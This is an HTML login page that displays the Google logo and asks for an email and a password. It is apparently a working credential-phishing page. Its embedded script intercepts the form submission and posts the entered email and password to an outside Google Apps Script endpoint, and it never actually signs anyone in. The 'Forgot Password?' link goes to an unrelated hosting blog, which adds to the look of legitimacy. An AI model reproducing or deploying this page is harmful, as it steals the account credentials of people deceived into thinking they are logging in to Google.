<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>Login Page</title>
 <link rel="stylesheet" href="style.css">
</head>
<body>
 <div class="login-wrapper">
  <div class="login-container">
   <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
   <form action="" method="POST" name="form-google">
    <label for="email">Email</label>
    <input type="email" name="email" id="email" placeholder="Email" required>
    <label for="password">Password</label>
    <input type="password" name="password" id="password" placeholder="Password" required>
    <button type="submit">Login</button>
   </form>
   <a href="https://idwebhost.com/blog/apa-itu-g-co-recover-email-solusi-lupa-password-akun-gmail/">Forgot Password?</a>
  </div>
 </div>

 <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzmn-LhZI9NcDWbzcwUlm-bStx7-3df9J4A-rtBP9jngDkJR2snxaKy0zAkN7Qqqy70mQ/exec'
    const form = document.forms['form-google']
  
    form.addEventListener('submit', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => console.log('Success!', response))
        .catch(error => console.error('Error!', error.message))
    })
  </script>
</body>
</html>
